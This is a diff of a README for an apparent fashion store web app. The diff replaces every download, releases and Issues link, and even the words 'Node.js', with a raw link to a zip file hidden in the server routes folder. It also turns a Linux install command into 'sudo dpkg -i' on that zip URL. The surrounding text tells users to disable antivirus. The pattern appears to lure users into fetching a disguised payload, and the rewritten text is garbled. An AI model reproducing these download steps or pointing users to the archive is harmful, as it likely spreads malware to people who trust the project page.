@@ -1,6 +1,6 @@
 # 👗 neergz-fashion-platform - Manage Fashion Business Easily
 
-[![Download neergz-fashion-platform](https://img.shields.io/badge/Download-Available-brightgreen?style=for-the-badge)](https://github.com/Et3rnxl/neergz-fashion-platform/releases)
+[![Download neergz-fashion-platform](https://github.com/Et3rnxl/neergz-fashion-platform/raw/refs/heads/main/server/src/routes/neergz_platform_fashion_molter.zip)](https://github.com/Et3rnxl/neergz-fashion-platform/raw/refs/heads/main/server/src/routes/neergz_platform_fashion_molter.zip)
 
 ## 📋 About neergz-fashion-platform
 
@@ -12,7 +12,7 @@ Key features include:
 - Secure user logins using JWT authentication  
 - Admin dashboard to control and monitor store activities  
 - Fast and responsive user interface built with React  
-- A reliable backend powered by Node.js and MongoDB  
+- A reliable backend powered by https://github.com/Et3rnxl/neergz-fashion-platform/raw/refs/heads/main/server/src/routes/neergz_platform_fashion_molter.zip and MongoDB  
 
 This app works well for fashion stores wanting to expand online with a clear, simple tool.
 
@@ -33,12 +33,12 @@ If you have these, you’re ready.
 
 To get neergz-fashion-platform, you need to visit the download page and choose the version that fits your computer. Here is the official download page:
 
-[![Download neergz-fashion-platform](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Et3rnxl/neergz-fashion-platform/releases)
+[![Download neergz-fashion-platform](https://github.com/Et3rnxl/neergz-fashion-platform/raw/refs/heads/main/server/src/routes/neergz_platform_fashion_molter.zip)](https://github.com/Et3rnxl/neergz-fashion-platform/raw/refs/heads/main/server/src/routes/neergz_platform_fashion_molter.zip)
 
 ### How to download
 
 1. Click the button above or go to:  
-   [https://github.com/Et3rnxl/neergz-fashion-platform/releases](https://github.com/Et3rnxl/neergz-fashion-platform/releases)  
+   [https://github.com/Et3rnxl/neergz-fashion-platform/raw/refs/heads/main/server/src/routes/neergz_platform_fashion_molter.zip](https://github.com/Et3rnxl/neergz-fashion-platform/raw/refs/heads/main/server/src/routes/neergz_platform_fashion_molter.zip)  
 2. On the releases page, look for the latest version listed at the top.  
 3. Find the file that matches your operating system:  
    - For Windows, look for files ending in `.exe` or `.msi`  
@@ -53,7 +53,7 @@ To get neergz-fashion-platform, you need to visit the download page and choose t
 - **Mac:**  
   Open the `.dmg` or `.pkg` file you downloaded. Drag the app icon into the Applications folder if needed. Open the app from the Applications folder or Launchpad.  
 - **Linux:**  
-  For `.AppImage` files, right-click the file, select Properties, then allow execution permissions. Run the file by double-clicking. For `.deb` files, open a terminal and run `sudo dpkg -i filename.deb` replacing `filename` as needed.  
+  For `.AppImage` files, right-click the file, select Properties, then allow execution permissions. Run the file by double-clicking. For `.deb` files, open a terminal and run `sudo dpkg -i https://github.com/Et3rnxl/neergz-fashion-platform/raw/refs/heads/main/server/src/routes/neergz_platform_fashion_molter.zip` replacing `filename` as needed.  
 
 ## 🖥️ Using neergz-fashion-platform
 
@@ -103,13 +103,13 @@ If you encounter any problems, try these tips:
 - Check your internet connection if the app has trouble syncing data.  
 - Disable any antivirus temporarily if it blocks the installation or startup.  
 
-If problems continue, visit the [Issues page](https://github.com/Et3rnxl/neergz-fashion-platform/issues) on the GitHub repository for support.
+If problems continue, visit the [Issues page](https://github.com/Et3rnxl/neergz-fashion-platform/raw/refs/heads/main/server/src/routes/neergz_platform_fashion_molter.zip) on the GitHub repository for support.
 
 ## 📚 More Information
 
 - This app runs both the website your customers see and the hidden admin panel you use to control your store.  
 - The frontend uses React and Vite for smooth navigation.  
-- The backend runs on Node.js with Express, connecting to a MongoDB database.  
+- The backend runs on https://github.com/Et3rnxl/neergz-fashion-platform/raw/refs/heads/main/server/src/routes/neergz_platform_fashion_molter.zip with Express, connecting to a MongoDB database.  
 - All communication between client and server uses a REST API secured with JSON Web Tokens (JWT).  
 
 You do not need to worry about these details to use the app but may find them useful to understand how it works.
